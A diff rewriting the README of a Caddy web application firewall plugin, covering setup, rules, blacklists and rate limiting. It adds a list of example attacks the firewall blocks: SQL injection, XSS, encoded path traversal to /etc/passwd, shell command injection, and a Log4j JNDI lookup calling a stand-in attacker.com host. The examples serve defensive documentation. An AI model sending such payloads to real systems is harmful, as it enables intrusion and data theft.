@@ -1,131 +1,183 @@
 # Caddy WAF Middleware
 
-This repository contains a custom Web Application Firewall (WAF) middleware for the Caddy web server. It allows you to define rules to inspect incoming HTTP requests, block or log potentially malicious activity, and enhance your application's security.
+A Web Application Firewall (WAF) middleware for Caddy server with rule-based filtering, blacklisting, and rate limiting.
 
 ## Features
+- Rule-based request filtering with regex patterns
+- IP and DNS blacklisting
+- Rate limiting per IP address
+- Anomaly scoring system
+- Request inspection (URL, args, body, headers)
+- Protection against common attacks (SQL injection, XSS, RCE, etc.)
+- Detailed logging support
 
-- **Rule-Based Filtering:** Use regular expressions to identify and mitigate common threats like SQL injection, XSS, and path traversal.
-- **Targeted Inspection:** Inspect specific parts of requests (URL, query parameters, body, headers).
-- **IP & DNS Blacklisting:** Block requests from specific IPs or domains with ease.
-- **Anomaly Scoring:** Apply a scoring system to block requests based on cumulative rule matches.
-- **Customizable Actions:** Choose to block or log suspicious requests based on matched rules.
-- **Flexible Configuration:** Configure the middleware directly via the Caddyfile.
-- **Comprehensive Logging:** Track matched rules and blocked requests with detailed logs.
+## Installation
 
-## Getting Started
+```bash
+xcaddy build --with github.com/fabriziosalmi/caddy-waf
+```
 
-### Prerequisites
+## Configuration
 
-- Go 1.20 or higher
-- Caddy v2
-
-### Installation
-
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/fabriziosalmi/caddy-waf.git
-   cd caddy-waf
-   ```
-
-2. Build the Caddy plugin:
-   ```bash
-   xcaddy build --with github.com/fabriziosalmi/caddy-waf
-   ```
-   This command creates a custom Caddy binary with the WAF middleware integrated.
-
-3. Replace the existing Caddy binary:
-   Replace your current `caddy` executable with the newly created binary.
-
-### Configuration
-
-Add the `waf` directive to your `Caddyfile` inside `route` blocks:
+Basic Caddyfile setup:
 
 ```caddyfile
-{
-    http_port 80
-}
-
 localhost {
     route {
         waf {
             rule_file rules.json
+            ip_blacklist_file blacklist.txt
+            dns_blacklist_file domains.txt
+            rate_limit 100 1m  # 100 requests per minute
             log_all
-            log_file "waf.log"
-            ip_blacklist_file ip_blacklist.txt
-            dns_blacklist_file dns_blacklist.txt
-            anomaly_threshold 7
+            anomaly_threshold 5
         }
         respond "Hello, world!"
     }
 }
 ```
 
-#### Configuration Options
+### Protected Attacks Examples
 
-- **`rule_file <path>`:** Path to a JSON file with WAF rules. Supports multiple files.
-- **`log_all`**: Logs all matched rules to the console.
-- **`log_file <path>`:** Specifies a custom log file for rule-triggered events.
-- **`ip_blacklist_file <path>`:** File with blocked IPs or CIDR subnets.
-- **`dns_blacklist_file <path>`:** File with blocked domains.
-- **`anomaly_threshold <number>`:** Total score threshold to block requests. Default: 5.
+The WAF protects against various attacks. Here are examples that would be blocked:
 
-### Rule File Format (`rules.json`)
+#### SQL Injection
+```http
+# Blocked: Basic SELECT injection
+GET /?id=1 SELECT * FROM users
 
-Define rules in JSON format:
+# Blocked: UNION-based injection
+GET /?id=1 UNION SELECT username,password FROM users
+
+# Blocked: Time-based injection
+GET /?id=1' AND SLEEP(5)--
+```
+
+#### Cross-Site Scripting (XSS)
+```http
+# Blocked: Basic script injection
+GET /?input=<script>alert(1)</script>
+
+# Blocked: Event handler injection
+GET /?input=<img onerror=alert(1) src=x>
+
+# Blocked: SVG-based XSS
+GET /?input=<svg/onload=alert(1)>
+```
+
+#### Path Traversal
+```http
+# Blocked: Directory traversal
+GET /../../etc/passwd
+
+# Blocked: Encoded traversal
+GET /%2e%2e%2f/etc/passwd
+
+# Blocked: Double-encoded traversal
+GET /%252e%252e%252f/etc/passwd
+```
+
+#### Remote Code Execution
+```http
+# Blocked: Command injection
+GET /?cmd=;ls;
+
+# Blocked: Shell command
+GET /?input=`cat /etc/passwd`
+
+# Blocked: System command execution
+GET /?input=$(ls -la)
+```
+
+#### Log4j Attacks
+```http
+# Blocked: JNDI lookup
+GET /?x=${jndi:ldap://attacker.com/a}
+
+# Blocked: Nested expression
+GET /?x=${${::-j}${::-n}${::-d}${::-i}}
+```
+
+#### Protocol Attacks
+```http
+# Blocked: Git repository access
+GET /.git/config
+
+# Blocked: Environment file access
+GET /.env
+
+# Blocked: Apache configuration
+GET /.htaccess
+```
+
+#### Scanner Detection
+```http
+# Blocked: Common scanner User-Agents
+User-Agent: sqlmap/1.4.7
+User-Agent: nikto/2.1.6
+User-Agent: nmap/7.80
+```
+
+### Configuration Options
+
+- `rule_file`: JSON file containing WAF rules
+- `ip_blacklist_file`: File with blocked IPs/CIDR ranges
+- `dns_blacklist_file`: File with blocked domains
+- `rate_limit <requests> <window>`: Rate limiting (e.g., "100 1m" for 100 requests per minute)
+- `log_all`: Enable detailed logging
+- `anomaly_threshold`: Cumulative score threshold (default: 5)
+
+### Rules Format (rules.json)
+
 ```json
 [
     {
-        "id": "rule_1",
+        "id": "sql_injection",
         "phase": 2,
         "pattern": "(?i)select.*from",
-        "targets": ["ARGS", "BODY", "URL"],
+        "targets": ["ARGS", "BODY"],
         "severity": "HIGH",
         "action": "block",
         "score": 3
-    },
-    {
-        "id": "rule_2",
-        "phase": 2,
-        "pattern": "(?i)<script>",
-        "targets": ["BODY", "HEADERS"],
-        "severity": "CRITICAL",
-        "action": "log",
-        "score": 5
     }
 ]
 ```
 
-### Blacklist File Formats
+### Blacklist Formats
+- `ip_blacklist.txt`: One IP/CIDR per line
+- `dns_blacklist.txt`: One domain per line
 
-- **`ip_blacklist.txt`:** Contains one IP or CIDR block per line.
-- **`dns_blacklist.txt`:** Contains one domain per line.
+## Rate Limiting
 
-### Example Files
+Rate limiting is configured with two parameters:
+- Number of requests allowed
+- Time window
 
-Sample rule and blacklist files are included in the repository for reference.
+Example configurations:
+```caddyfile
+# 100 requests per minute
+rate_limit 100 1m
+
+# 10 requests per second
+rate_limit 10 1s
+
+# 1000 requests per hour
+rate_limit 1000 1h
+```
+
+Exceeding the rate limit returns HTTP 429 (Too Many Requests).
 
 ## Testing
 
-Run the test suite:
+Test rate limiting:
 ```bash
-./test.sh
+# Test 5 requests per 5 seconds limit
+for i in {1..6}; do curl -i http://localhost:8080/; done
+
+# Load test
+ab -n 100 -c 10 http://localhost:8080/
 ```
-Test results are saved in `waf_test_results.log`.
-
-## Future Enhancements
-
-- Advanced anomaly scoring based on severity levels.
-- Integration with external alerting systems.
-- Streaming support for large request bodies.
-- Optimized regex matching for performance.
-- Granular targeting for specific request headers.
-
-## Contributing
-
-Contributions are welcome! Submit pull requests to add features, fix bugs, or enhance documentation.
 
 ## License
 
-This project is licensed under the [AGPLv3 License](LICENSE).
-
-Repository: [Caddy WAF](https://github.com/fabriziosalmi/caddy-waf/tree/main)
+AGPLv3
